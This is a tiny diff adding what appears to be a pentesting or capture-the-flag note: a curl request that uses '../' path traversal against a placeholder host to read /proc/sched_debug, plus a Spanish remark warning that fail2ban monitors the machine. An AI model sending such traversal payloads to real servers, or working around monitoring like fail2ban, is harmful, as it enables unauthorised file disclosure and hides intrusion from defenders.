@@ -1,0 +1,11 @@
+
+	/proc/sched_debug
+
+
+:::  curl  -s  -X  GET    "http://targed_url.test/../../../../../../../../proc/sched_debug"
+
+
+
+
+		
+		"" cuidado con  fail2ban-server  ... maquina monitoreada ""
